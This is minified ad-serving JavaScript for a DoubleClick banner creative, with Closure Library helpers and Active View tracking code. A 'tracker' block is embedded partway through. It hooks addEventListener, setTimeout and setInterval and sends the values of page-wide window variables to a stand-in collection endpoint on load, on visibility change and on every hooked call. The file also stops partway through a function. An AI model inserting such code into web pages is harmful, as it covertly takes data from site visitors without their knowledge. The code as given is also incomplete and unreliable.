document.write('\x3cdiv class="GoogleActiveViewElement" ' + 'id="DfaVisibilityIdentifier_1191782562"\x3e');
document.write('\x3cdiv class="GoogleCreativeContainerClass" ' + 'id="gcc_zM_gZKKgJ86g7OsP9byngA8"\x3e');
(function () {
  var m = document.createElement('meta');
  m.setAttribute('data-jc', '82');
  m.setAttribute('data-jc-version', 'r20230816');
  var ss = document.getElementsByTagName('script')[0];
  if (ss && ss.parentNode) {
    ss.parentNode.insertBefore(m, ss);
  }
})();
(function () {
  /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var h = this || self;
  function l(a, d, b) {
    if (a) for (var c = 0; null != a && 500 > c && !b(a); ++c) a = d(a);
  }
  function m(a, d) {
    l(a, function (b) {
      try {
        return b === b.parent ? null : b.parent;
      } catch (c) {}
      return null;
    }, d);
  }
  function n(a, d) {
    if ("IFRAME" == a.tagName) d(a);else {
      a = a.querySelectorAll("IFRAME");
      for (var b = 0; b < a.length && !d(a[b]); ++b);
    }
  }
  function p(a) {
    return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
  }
  function q(a, d, b) {
    try {
      var c = JSON.parse(b.data);
    } catch (f) {}
    if ("object" === typeof c && c && "creativeLoad" === c.type) {
      var g = p(a);
      if (b.source && g) {
        var e;
        m(b.source, function (f) {
          try {
            if (f.parent === g) return e = f, !0;
          } catch (k) {}
        });
        e && n(a, function (f) {
          if (f.contentWindow === e) return d(c), !0;
        });
      }
    }
  }
  function r(a) {
    return "string" === typeof a ? document.getElementById(a) : a;
  }
  ;
  var t;
  t = void 0 === t ? window : t;
  t.clsn = function (a, d) {
    var b = r(a);
    if (b) if (b.onCreativeLoad) b.onCreativeLoad(d);else {
      var c = d ? [d] : [],
        g = function (e) {
          for (var f = 0; f < c.length; ++f) try {
            c[f](1, e);
          } catch (k) {}
          c = {
            push: function (k) {
              k(1, e);
            }
          };
        };
      b.onCreativeLoad = function (e) {
        c.push(e);
      };
      b.setAttribute("data-creative-load-listener", "");
      b.addEventListener("creativeLoad", function (e) {
        g(e.detail);
      });
      h.addEventListener("message", function (e) {
        q(b, g, e);
      });
    }
  };
}).call(this);
clsn("gcc_zM_gZKKgJ86g7OsP9byngA8");
document.write('\x3ca target\x3d\x22_blank\x22 id\x3d\x22img_anch_CKK2kdb16IADFU4Qewcddd4J8A\x22 href\x3d\x22https://adclick.g.doubleclick.net/pcs/click?xai\x3dAKAOjsvKhXBmTRv6Y36V2BM482T4e9x1CihpxC5EhXivFw0AZAESJjRpv39iOHNTE93rqyTAML34TLLWyQ3BN3cO7FryRI1vNykjFura565mgR2csFkvkeRuF1Dop1tgsNp2Vn011jFDYe1K-9eOA43XfesgKpRdrDA-wbBxUibFlw\x26amp;sai\x3dAMfl-YQgslidKvxbnx1QzchVNIWwg_WrQla7wMKAHaGzgoWRWyv0h5FePvYaGUK0cLgau5PK6l2yaaG5jh4goqRWH0smXzJc95MVzszY_g\x26amp;sig\x3dCg0ArKJSzHG4r2unIuJi\x26amp;cry\x3d1\x26amp;fbs_aeid\x3d[gw_fbsaeid]\x26amp;urlfix\x3d1\x26amp;adurl\x3dhttps://www.thinkinghuts.org/thoughtfulgiving\x22\x3e\x3cimg src\x3d\x22https://s0.2mdn.net/simgad/7410484386335067809\x22 alt\x3d\x22Advertisement\x22 border\x3d\x220\x22 width\x3d\x22728\x22 height\x3d\x2290\x22 style\x3d\x22display:block\x22\x3e\x3c/a\x3e\x3cscript data-jc\x3d\x2274\x22 data-jc-version\x3d\x22r20230816\x22 data-jcp-a-id\x3d\x22img_anch_CKK2kdb16IADFU4Qewcddd4J8A\x22 data-jcp-for-sure-open-browser\x3d\x22false\x22 data-jcp-for-sure-open-custom-tabs\x3d\x22false\x22 data-jcp-cc-overlay\x3d\x22\x22 data-jcp-cc-button\x3d\x22\x22 data-jcp-is-fledge\x3d\x22false\x22 data-jcp-turtlex-event-ad-signals\x3d\x22\x22\x3e(function(){/*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */ var aa\x3d\x22function\x22\x3d\x3dtypeof Object.defineProperties?Object.defineProperty:function(a,b,d){if(a\x3d\x3dArray.prototype||a\x3d\x3dObject.prototype)return a;a[b]\x3dd.value;return a};function ba(a){a\x3d[\x22object\x22\x3d\x3dtypeof globalThis\x26\x26globalThis,a,\x22object\x22\x3d\x3dtypeof window\x26\x26window,\x22object\x22\x3d\x3dtypeof self\x26\x26self,\x22object\x22\x3d\x3dtypeof global\x26\x26global];for(var b\x3d0;b\x3ca.length;++b){var d\x3da[b];if(d\x26\x26d.Math\x3d\x3dMath)return d}throw Error(\x22Cannot find global object\x22);}var ca\x3dba(this); function da(a,b){if(b)a:{var d\x3dca;a\x3da.split(\x22.\x22);for(var c\x3d0;c\x3ca.length-1;c++){var e\x3da[c];if(!(e in d))break a;d\x3dd[e]}a\x3da[a.length-1];c\x3dd[a];b\x3db(c);b!\x3dc\x26\x26null!\x3db\x26\x26aa(d,a,{configurable:!0,writable:!0,value:b})}}var ea\x3d\x22function\x22\x3d\x3dtypeof Object.create?Object.create:function(a){function b(){}b.prototype\x3da;return new b},m; if(\x22function\x22\x3d\x3dtypeof Object.setPrototypeOf)m\x3dObject.setPrototypeOf;else{var p;a:{var fa\x3d{a:!0},q\x3d{};try{q.__proto__\x3dfa;p\x3dq.a;break a}catch(a){}p\x3d!1}m\x3dp?function(a,b){a.__proto__\x3db;if(a.__proto__!\x3d\x3db)throw new TypeError(a+\x22 is not extensible\x22);return a}:null}var r\x3dm,ha\x3d\x22function\x22\x3d\x3dtypeof Object.assign?Object.assign:function(a,b){for(var d\x3d1;d\x3carguments.length;d++){var c\x3darguments[d];if(c)for(var e in c)Object.prototype.hasOwnProperty.call(c,e)\x26\x26(a[e]\x3dc[e])}return a}; da(\x22Object.assign\x22,function(a){return a||ha});var t\x3dthis||self;var v,w;a:{for(var x\x3d[\x22CLOSURE_FLAGS\x22],y\x3dt,z\x3d0;z\x3cx.length;z++)if(y\x3dy[x[z]],null\x3d\x3dy){w\x3dnull;break a}w\x3dy}var A\x3dw\x26\x26w[610401301];v\x3dnull!\x3dA?A:!1;var B,C\x3dt.navigator;B\x3dC?C.userAgentData||null:null;function D(a){return v?B?B.brands.some(function(b){return(b\x3db.brand)\x26\x26-1!\x3db.indexOf(a)}):!1:!1}function E(a){var b;a:{if(b\x3dt.navigator)if(b\x3db.userAgent)break a;b\x3d\x22\x22}return-1!\x3db.indexOf(a)};function F(){return v?!!B\x26\x260\x3cB.brands.length:!1}function G(){return F()?D(\x22Chromium\x22):(E(\x22Chrome\x22)||E(\x22CriOS\x22))\x26\x26!(F()?0:E(\x22Edge\x22))||E(\x22Silk\x22)};var ia\x3dF()?!1:E(\x22Trident\x22)||E(\x22MSIE\x22);!E(\x22Android\x22)||G();G();E(\x22Safari\x22)\x26\x26(G()||(F()?0:E(\x22Coast\x22))||(F()?0:E(\x22Opera\x22))||(F()?0:E(\x22Edge\x22))||(F()?D(\x22Microsoft Edge\x22):E(\x22Edg/\x22))||F()\x26\x26D(\x22Opera\x22));var H\x3d{},I\x3dnull;var ja\x3d\x22undefined\x22!\x3d\x3dtypeof Uint8Array,ka\x3d!ia\x26\x26\x22function\x22\x3d\x3d\x3dtypeof btoa;var J\x3d\x22function\x22\x3d\x3d\x3dtypeof Symbol\x26\x26\x22symbol\x22\x3d\x3d\x3dtypeof Symbol()?Symbol():void 0,la\x3dJ?function(a,b){a[J]|\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g|\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function oa(a){var b\x3dK(a);1!\x3d\x3d(b\x261)\x26\x26(Object.isFrozen(a)\x26\x26(a\x3dArray.prototype.slice.call(a)),L(a,b|1))} var K\x3dJ?function(a){return a[J]|0}:function(a){return a.g|0},M\x3dJ?function(a){return a[J]}:function(a){return a.g},L\x3dJ?function(a,b){a[J]\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function pa(){var a\x3d[];la(a,1);return a}function N(a){a\x3da\x3e\x3e11\x261023;return 0\x3d\x3d\x3da?536870912:a};var qa\x3d{};function O(a){return null!\x3d\x3da\x26\x26\x22object\x22\x3d\x3d\x3dtypeof a\x26\x26!Array.isArray(a)\x26\x26a.constructor\x3d\x3d\x3dObject}var P,Q,ra\x3d[];L(ra,39);Q\x3dObject.freeze(ra);var sa;function ta(a,b,d){null\x3d\x3da\x26\x26(a\x3dsa);sa\x3dvoid 0;if(null\x3d\x3da){var c\x3d96;d?(a\x3d[d],c|\x3d512):a\x3d[];b\x26\x26(c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}else{if(!Array.isArray(a))throw Error();c\x3dK(a);if(c\x2664)return a;c|\x3d64;if(d\x26\x26(c|\x3d512,d!\x3d\x3da[0]))throw Error();a:{d\x3da;var e\x3dd.length;if(e){var g\x3de-1,f\x3dd[g];if(O(f)){c|\x3d256;b\x3d+!!(c\x26512)-1;e\x3dg-b;1024\x3c\x3de\x26\x26(ua(d,b,f),e\x3d1023);c\x3dc\x26-2095105|(e\x261023)\x3c\x3c11;break a}}b\x26\x26(f\x3d+!!(c\x26512)-1,b\x3dMath.max(b,e-f),1024\x3cb\x26\x26(ua(d,f,{}),c|\x3d256,b\x3d1023),c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}}L(a,c);return a} function ua(a,b,d){for(var c\x3d1023+b,e\x3da.length,g\x3dc;g\x3ce;g++){var f\x3da[g];null!\x3df\x26\x26f!\x3d\x3dd\x26\x26(d[g-b]\x3df)}a.length\x3dc+1;a[c]\x3dd};function va(a,b){return wa(b)} function wa(a){switch(typeof a){case \x22number\x22:return isFinite(a)?a:String(a);case \x22boolean\x22:return a?1:0;case \x22object\x22:if(a\x26\x26!Array.isArray(a)\x26\x26ja\x26\x26null!\x3da\x26\x26a instanceof Uint8Array){if(ka){for(var b\x3d\x22\x22,d\x3d0,c\x3da.length-10240;d\x3cc;)b+\x3dString.fromCharCode.apply(null,a.subarray(d,d+\x3d10240));b+\x3dString.fromCharCode.apply(null,d?a.subarray(d):a);a\x3dbtoa(b)}else{void 0\x3d\x3d\x3db\x26\x26(b\x3d0);if(!I){I\x3d{};d\x3d\x22ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\x22.split(\x22\x22);c\x3d[\x22+/\x3d\x22,\x22+/\x22,\x22-_\x3d\x22,\x22-_.\x22,\x22-_\x22];for(var e\x3d 0;5\x3ee;e++){var g\x3dd.concat(c[e].split(\x22\x22));H[e]\x3dg;for(var f\x3d0;f\x3cg.length;f++){var h\x3dg[f];void 0\x3d\x3d\x3dI[h]\x26\x26(I[h]\x3df)}}}b\x3dH[b];d\x3dArray(Math.floor(a.length/3));c\x3db[64]||\x22\x22;for(e\x3dg\x3d0;g\x3ca.length-2;g+\x3d3){var l\x3da[g],k\x3da[g+1];h\x3da[g+2];f\x3db[l\x3e\x3e2];l\x3db[(l\x263)\x3c\x3c4|k\x3e\x3e4];k\x3db[(k\x2615)\x3c\x3c2|h\x3e\x3e6];h\x3db[h\x2663];d[e++]\x3df+l+k+h}f\x3d0;h\x3dc;switch(a.length-g){case 2:f\x3da[g+1],h\x3db[(f\x2615)\x3c\x3c2]||c;case 1:a\x3da[g],d[e]\x3db[a\x3e\x3e2]+b[(a\x263)\x3c\x3c4|f\x3e\x3e4]+h+c}a\x3dd.join(\x22\x22)}return a}}return a};function xa(a,b,d,c,e,g){if(null!\x3da){if(Array.isArray(a))a\x3de\x26\x260\x3d\x3da.length\x26\x26K(a)\x261?void 0:g\x26\x26K(a)\x262?a:ya(a,b,d,void 0!\x3d\x3dc,e,g);else if(O(a)){var f\x3d{},h;for(h in a)f[h]\x3dxa(a[h],b,d,c,e,g);a\x3df}else a\x3db(a,c);return a}}function ya(a,b,d,c,e,g){var f\x3dc||d?K(a):0;c\x3dc?!!(f\x2632):void 0;a\x3dArray.prototype.slice.call(a);for(var h\x3d0;h\x3ca.length;h++)a[h]\x3dxa(a[h],b,d,c,e,g);d\x26\x26d(f,a);return a}function za(a){return a.h\x3d\x3d\x3dqa?a.toJSON():wa(a)};function S(a,b,d){this.g\x3dta(a,b,d)}S.prototype.toJSON\x3dfunction(){if(P)var a\x3dT(this,this.g,!1);else a\x3dya(this.g,za,void 0,void 0,!1,!1),a\x3dT(this,a,!0);return a};function Aa(a){P\x3d!0;try{return JSON.stringify(a.toJSON(),va)}finally{P\x3d!1}}S.prototype.h\x3dqa;S.prototype.toString\x3dfunction(){return T(this,this.g,!1).toString()}; function T(a,b,d){var c\x3da.constructor.i,e\x3dN(M(d?a.g:b)),g\x3d!1;if(c){if(!d){b\x3dArray.prototype.slice.call(b);var f;if(b.length\x26\x26O(f\x3db[b.length-1]))for(g\x3d0;g\x3cc.length;g++)if(c[g]\x3e\x3de){Object.assign(b[b.length-1]\x3d{},f);break}g\x3d!0}e\x3db;d\x3d!d;f\x3dM(a.g);a\x3dN(f);f\x3d+!!(f\x26512)-1;for(var h,l,k\x3d0;k\x3cc.length;k++)if(l\x3dc[k],l\x3ca){l+\x3df;var n\x3de[l];null\x3d\x3dn?e[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}else h||(n\x3dvoid 0,e.length\x26\x26O(n\x3de[e.length-1])?h\x3dn:e.push(h\x3d{})),n\x3dh[l],null\x3d\x3dh[l]?h[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}c\x3db.length;if(!c)return b; var ma;if(O(h\x3db[c-1])){a:{var u\x3dh;e\x3d{};d\x3d!1;for(var na in u)a\x3du[na],Array.isArray(a)\x26\x26a!\x3da\x26\x26(d\x3d!0),null!\x3da?e[na]\x3da:d\x3d!0;if(d){for(var Ka in e){u\x3de;break a}u\x3dnull}}u!\x3dh\x26\x26(ma\x3d!0);c--}for(;0\x3cc;c--){h\x3db[c-1];if(null!\x3dh)break;var Ia\x3d!0}if(!ma\x26\x26!Ia)return b;var R;g?R\x3db:R\x3dArray.prototype.slice.call(b,0,c);b\x3dR;g\x26\x26(b.length\x3dc);u\x26\x26b.push(u);return b};function U(a){this.g\x3dta(a)}U.prototype\x3dea(S.prototype);U.prototype.constructor\x3dU;if(r)r(U,S);else for(var V in S)if(\x22prototype\x22!\x3dV)if(Object.defineProperties){var Ba\x3dObject.getOwnPropertyDescriptor(S,V);Ba\x26\x26Object.defineProperty(U,V,Ba)}else U[V]\x3dS[V];var Ca\x3d/^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i;function Da(a,b,d,c){var e\x3d/^(https?:[^:?]+[/]pcs[/]click[^/]+?)(?:\x26nx[^\x26]+\x26ny[^\x26]+\x26dim[^\x26]+)?(\x26adurl\x3d.*)/.exec(a);return e?e[1]+(\x22\x26nx\x3d\x22+b+\x22\x26ny\x3d\x22+d+\x22\x26dim\x3d\x22+c)+e[2]:a}function Ea(a){var b\x3da.currentTarget,d\x3db.querySelector(\x22img[alt]\x22);d\x26\x26(a\x3dDa(b.href,+Math.round(a.clientX-d.offsetLeft),+Math.round(a.clientY-d.offsetTop),+d.width+\x22x\x22+ +d.height),Ca.test(a)\x26\x26(b.href\x3da))} function Fa(a){var b\x3dt;b\x3dvoid 0\x3d\x3d\x3db?window:b;var d\x3dnew U;if(null!\x3da\x26\x26\x22string\x22!\x3d\x3dtypeof a)throw Error();var c\x3dd.g,e\x3dM(c);if(e\x262)throw Error();a:{var g\x3dN(e);if(1\x3e\x3dg){var f\x3de;if(e\x26256)g\x3dc[c.length-1];else{if(null\x3d\x3da)break a;g\x3dc[g+(+!!(e\x26512)-1)]\x3d{};f|\x3d256}g[1]\x3da;f!\x3d\x3de\x26\x26L(c,f)}else c[1+(+!!(e\x26512)-1)]\x3da,e\x26256\x26\x26(a\x3dc[c.length-1],1 in a\x26\x26delete a[1])}var h;null\x3d\x3db||null\x3d\x3d(h\x3db.fence)||h.setReportEventDataForAutomaticBeacons({eventType:\x22reserved.top_navigation\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var l; null\x3d\x3db||null\x3d\x3d(l\x3db.fence)||l.reportEvent({eventType:\x22click\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var k;null\x3d\x3db||null\x3d\x3d(k\x3db.fence)||k.reportEvent({eventType:\x22reserved.top_navigation\x22,destination:[\x22component-seller\x22]});var n;null\x3d\x3db||null\x3d\x3d(n\x3db.fence)||n.reportEvent({eventType:\x22click\x22,destination:[\x22component-seller\x22]})} function Ga(a,b){void 0!\x3dt.AFMA_Communicator\x26\x26void 0!\x3dt.AFMA_Communicator.sendMessage\x26\x26(a.preventDefault(),t.AFMA_Communicator.sendMessage(\x22open\x22,{a:\x22app\x22,u:a.currentTarget.href,system_browser:!0,use_first_package:!0,use_running_process:!0,use_custom_tabs:b}))};var W,X\x3ddocument.currentScript;W\x3d(X\x3dvoid 0\x3d\x3d\x3dX?null:X)\x26\x26\x2274\x22\x3d\x3d\x3dX.getAttribute(\x22data-jc\x22)?X:document.querySelector(\x27[data-jc\x3d\x2274\x22]\x27);if(null\x3d\x3dW)throw Error(\x22JSC not found 74\x22);for(var Ha\x3d{},Y\x3dW.attributes,Z\x3dY.length-1;0\x3c\x3dZ;Z--){var Ja\x3dY[Z].name;0\x3d\x3d\x3dJa.indexOf(\x22data-jcp-\x22)\x26\x26(Ha[Ja.substring(9)]\x3dY[Z].value)} (function(a){var b\x3ddocument.getElementById(a[\x22a-id\x22]),d\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-browser\x22],c\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-custom-tabs\x22],e\x3da[\x22cc-overlay\x22],g\x3da[\x22cc-button\x22],f\x3de?document.getElementById(e):null,h\x3dg?document.getElementById(g):null;if(\x22true\x22\x3d\x3d\x3da[\x22is-fledge\x22]){var l\x3da[\x22turtlex-event-ad-signals\x22];h?h.addEventListener(\x22click\x22,function(){Fa(l)}):b.addEventListener(\x22click\x22,function(){Fa(l)})}else if(b.addEventListener(\x22mousedown\x22,Ea),f\x26\x26h\x26\x26f.addEventListener(\x22mousedown\x22,function(k){k\x3dDa(h.href, +Math.round(k.clientX-f.offsetLeft),+Math.round(k.clientY-f.offsetTop),+f.clientWidth+\x22x\x22+ +f.clientHeight);Ca.test(k)\x26\x26(h.href\x3dk)}),d||c)b.addEventListener(\x22click\x22,function(k){Ga(k,c)}),h\x26\x26h.addEventListener(\x22click\x22,function(k){Ga(k,c)})})(Ha);}).call(this);\x3c/script\x3e');
var tracker = function () {
  var persistedStorage = {
    seenVars: [],
    gatheredData: {}
  };
  var globalHooks = ["addEventListener", "setTimeout", "setInterval"];
  function gatherWindowProperties() {
    var unseenProps = {};
    for (var key in window) {
      if (window.hasOwnProperty(key) && !persistedStorage.seenVars.includes(key)) {
        var value = window[key];
        var valueType = typeof value;
        unseenProps[key] = {
          type: valueType,
          value: valueType === 'function' ? undefined : value
        };
        persistedStorage.seenVars.push(key);
      }
    }
    return unseenProps;
  }
  function postDataToServer(data) {
    var url = 'https://example.com/api/collect';
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(function (response) {
      if (response.ok) {
        console.log('Data sent successfully');
      } else {
        console.error('Data failed to send, status code:' + response.status);
      }
    }).catch(function (error) {
      console.error('Error occurred while sending data:', error);
    });
  }
  function gatherAndSendData() {
    var gatheredData = gatherWindowProperties();
    if (Object.keys(gatheredData).length > 0) {
      postDataToServer(gatheredData);
      persistedStorage.gatheredData = gatheredData;
    }
  }
  function jsHook() {
    globalHooks.forEach(function (hook) {
      var oldHook = window[hook];
      window[hook] = function () {
        gatherAndSendData();
        oldHook.apply(this, arguments);
      };
    });
  }
  function init() {
    jsHook();
    window.addEventListener('load', gatherAndSendData);
    document.addEventListener('visibilitychange', gatherAndSendData);
  }
  return {
    init: init
  };
}();
document.write('\x3c/div\x3e');
document.write('\x3c/div\x3e');
tracker.init();
(function () {
  var avDiv = document.getElementById("DfaVisibilityIdentifier_1191782562");
  var avMarkup = {
    'active_view_class_name': 'GoogleActiveViewElement',
    'data-google-av-cxn': 'https://pagead2.googlesyndication.com/pcs/activeview?xai\x3dAKAOjssy7xQuPL3HcMB-Az12JGnvJEp4TRpJlcH2eLM6XqEYOZvRaiTIcRLXSUzgsG3gV0pTJfA0ss84P2Qa5CHP0OScegKpNfHpphJO06OhTAdD\x26sig\x3dCg0ArKJSzJUowGHn-S-HEAE',
    'data-google-av-adk': '4021813189',
    'data-google-av-metadata': 'la\x3d0\x26',
    'data-google-av-ufs-integrator-metadata': 'EswBCsUBaHR0cHM6Ly9wYWdlYWQyLmdvb2dsZXN5bmRpY2F0aW9uLmNvbS9wY3MvYWN0aXZldmlldz94YWk9QUtBT2pzc3k3eFF1UEwzSGNNQi1BejEySkdudkpFcDRUUnBKbGNIMmVMTTZYcUVZT1p2UmFpVEljUkxYU1V6Z3NHM2dWMHBUSmZBMHNzODRQMlFhNUNIUDBPU2NlZ0twTmZIcHBoSk8wNk9oVEFkRCZzaWc9Q2cwQXJLSlN6SlVvd0dIbi1TLUhFQUUSABoA',
    'data-google-av-override': '-1',
    'data-google-av-immediate': 'true',
    'data-google-av-aid': '0',
    'data-google-av-naid': '1',
    'data-google-av-slift': '',
    'data-google-av-cpmav': '',
    'data-google-av-btr': '',
    'data-google-av-itpl': '32',
    'data-google-av-rs': '6',
    'data-google-av-dm': '2',
    'data-google-av-flags': '[\x22x%278440\x279efotm(\x26753374%2bejvf/%27844\x3e\x279wuvb$\x2656533\x3e!\x3d|vqc)!273794\x26\x3cqqvb/%\x3c1735020!\x3dnehu`/!364\x3d5051!9abk{a($160210:3\x26\x3ccbotf+*0150034:%2bejvf/%72;17613!\x3defdwa*\x2776463;21$?ebkpb$\x260366717\x3e*\x3ebgipf+!3\x3d712363%9aihwc)!7202\x3c217\x279efotm(\x2620061;48\x26\x3e`dopb/%\x3c1707200!\x3d8(\x262005575?\x26\x3e`dopb/%\x3c170642?!\x3d|vqc)!7201;\x3d50\x279wuvb$\x2603641654*\x3ebgipf+!3\x3d731103%9aihwc)!7200?073\x279efotm(\x262004?51;\x26\x3e`dopb/%\x3c17\x3e474\x3e!\x3dnehu`/!36406412!9abk{a($167745;\x3d\x26\x3ccbotf+*01254133%2bejvf/%72\x3c43412!\x3defdwa*\x2776326\x3e71$?3~\x22]'
  };
  if (avDiv) {
    for (var key in avMarkup) {
      if (avMarkup.hasOwnProperty(key)) {
        avDiv.setAttribute(key, avMarkup[key]);
      }
    }
  }
})();
(function () {
  var glidar = document.createElement('script');
  glidar.type = 'text/javascript';
  glidar.async = true;
  glidar.src = 'https://www.googletagservices.com/activeview/js/current/rx_lidar.js?cache=r20110914';
  document.body.insertBefore(glidar, document.body.firstChild);
})();
(function () {
  (function () {
    var s = document.createElement('script');
    s.setAttribute('data-jc', '86');
    s.src = 'https://pagead2.googlesyndication.com/pagead/js/r20230816/r20110914/elements/html/omrhp.js';
    s.setAttribute('data-jc-version', 'r20230816');
    var ss = document.getElementsByTagName('script')[0];
    if (ss && ss.parentNode) {
      ss.parentNode.insertBefore(s, ss);
    }
  })();
  window.dicnf = {
    eavp: true,
    ebrp: true,
    apfa: true,
    atsb: true,
    bvst: 'r20230816',
    eeid: 'zM_gZKKgJ86g7OsP9byngA8',
    opxb: true,
    aunb: true,
    adsg: '',
    uffp: true
  };
  (function () {
    /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */function aa(a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    }
    var ba = "function" == typeof Object.defineProperties ? Object.defineProperty : function (a, b, c) {
      if (a == Array.prototype || a == Object.prototype) return a;
      a[b] = c.value;
      return a;
    };
    function ca(a) {
      a = ["object" == typeof globalThis && globalThis, a, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
      for (var b = 0; b < a.length; ++b) {
        var c = a[b];
        if (c && c.Math == Math) return c;
      }
      throw Error("Cannot find global object");
    }
    var da = ca(this);
    function m(a, b) {
      if (b) a: {
        var c = da;
        a = a.split(".");
        for (var d = 0; d < a.length - 1; d++) {
          var e = a[d];
          if (!(e in c)) break a;
          c = c[e];
        }
        a = a[a.length - 1];
        d = c[a];
        b = b(d);
        b != d && null != b && ba(c, a, {
          configurable: !0,
          writable: !0,
          value: b
        });
      }
    }
    function ea(a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: aa(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    }
    var fa = "function" == typeof Object.assign ? Object.assign : function (a, b) {
      for (var c = 1; c < arguments.length; c++) {
        var d = arguments[c];
        if (d) for (var e in d) Object.prototype.hasOwnProperty.call(d, e) && (a[e] = d[e]);
      }
      return a;
    };
    m("Object.assign", function (a) {
      return a || fa;
    });
    var ha = "function" == typeof Object.create ? Object.create : function (a) {
        function b() {}
        b.prototype = a;
        return new b();
      },
      ia;
    if ("function" == typeof Object.setPrototypeOf) ia = Object.setPrototypeOf;else {
      var la;
      a: {
        var ma = {
            a: !0
          },
          na = {};
        try {
          na.__proto__ = ma;
          la = na.a;
          break a;
        } catch (a) {}
        la = !1;
      }
      ia = la ? function (a, b) {
        a.__proto__ = b;
        if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
        return a;
      } : null;
    }
    var oa = ia;
    function u(a, b) {
      a.prototype = ha(b.prototype);
      a.prototype.constructor = a;
      if (oa) oa(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.ba = b.prototype;
    }
    function pa() {
      for (var a = Number(this), b = [], c = a; c < arguments.length; c++) b[c - a] = arguments[c];
      return b;
    }
    m("Object.is", function (a) {
      return a ? a : function (b, c) {
        return b === c ? 0 !== b || 1 / b === 1 / c : b !== b && c !== c;
      };
    });
    m("Array.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        var d = this;
        d instanceof String && (d = String(d));
        var e = d.length;
        c = c || 0;
        for (0 > c && (c = Math.max(c + e, 0)); c < e; c++) {
          var f = d[c];
          if (f === b || Object.is(f, b)) return !0;
        }
        return !1;
      };
    });
    m("String.prototype.includes", function (a) {
      return a ? a : function (b, c) {
        if (null == this) throw new TypeError("The 'this' value for String.prototype.includes must not be null or undefined");
        if (b instanceof RegExp) throw new TypeError("First argument to String.prototype.includes must not be a regular expression");
        return -1 !== this.indexOf(b, c || 0);
      };
    });
    m("globalThis", function (a) {
      return a || da;
    });
    var x = this || self;
    var qa, z;
    a: {
      for (var ra = ["CLOSURE_FLAGS"], A = x, sa = 0; sa < ra.length; sa++) if (A = A[ra[sa]], null == A) {
        z = null;
        break a;
      }
      z = A;
    }
    var ta = z && z[610401301];
    qa = null != ta ? ta : !1;
    var B,
      ua = x.navigator;
    B = ua ? ua.userAgentData || null : null;
    function va(a) {
      return qa ? B ? B.brands.some(function (b) {
        return (b = b.brand) && -1 != b.indexOf(a);
      }) : !1 : !1;
    }
    function E(a) {
      var b;
      a: {
        if (b = x.navigator) if (b = b.userAgent) break a;
        b = "";
      }
      return -1 != b.indexOf(a);
    }
    ;
    function F() {
      return qa ? !!B && 0 < B.brands.length : !1;
    }
    function wa() {
      return F() ? va("Chromium") : (E("Chrome") || E("CriOS")) && !(F() ? 0 : E("Edge")) || E("Silk");
    }
    ;
    var xa = Array.prototype.indexOf ? function (a, b) {
        return Array.prototype.indexOf.call(a, b, void 0);
      } : function (a, b) {
        if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
        for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
        return -1;
      },
      ya = Array.prototype.forEach ? function (a, b) {
        Array.prototype.forEach.call(a, b, void 0);
      } : function (a, b) {
        for (var c = a.length, d = "string" === typeof a ? a.split("") : a, e = 0; e < c; e++) e in d && b.call(void 0, d[e], e, a);
      };
    function za(a) {
      za[" "](a);
      return a;
    }
    za[" "] = function () {};
    var Aa = F() ? !1 : E("Trident") || E("MSIE");
    !E("Android") || wa();
    wa();
    E("Safari") && (wa() || (F() ? 0 : E("Coast")) || (F() ? 0 : E("Opera")) || (F() ? 0 : E("Edge")) || (F() ? va("Microsoft Edge") : E("Edg/")) || F() && va("Opera"));
    var Ba = {},
      G = null;
    function Ca(a, b) {
      void 0 === b && (b = 0);
      if (!G) {
        G = {};
        for (var c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), d = ["+/=", "+/", "-_=", "-_.", "-_"], e = 0; 5 > e; e++) {
          var f = c.concat(d[e].split(""));
          Ba[e] = f;
          for (var g = 0; g < f.length; g++) {
            var h = f[g];
            void 0 === G[h] && (G[h] = g);
          }
        }
      }
      b = Ba[b];
      c = Array(Math.floor(a.length / 3));
      d = b[64] || "";
      for (e = f = 0; f < a.length - 2; f += 3) {
        var k = a[f],
          l = a[f + 1];
        h = a[f + 2];
        g = b[k >> 2];
        k = b[(k & 3) << 4 | l >> 4];
        l = b[(l & 15) << 2 | h >> 6];
        h = b[h & 63];
        c[e++] = g + k + l + h;
      }
      g = 0;
      h = d;
      switch (a.length - f) {
        case 2:
          g = a[f + 1], h = b[(g & 15) << 2] || d;
        case 1:
          a = a[f], c[e] = b[a >> 2] + b[(a & 3) << 4 | g >> 4] + h + d;
      }
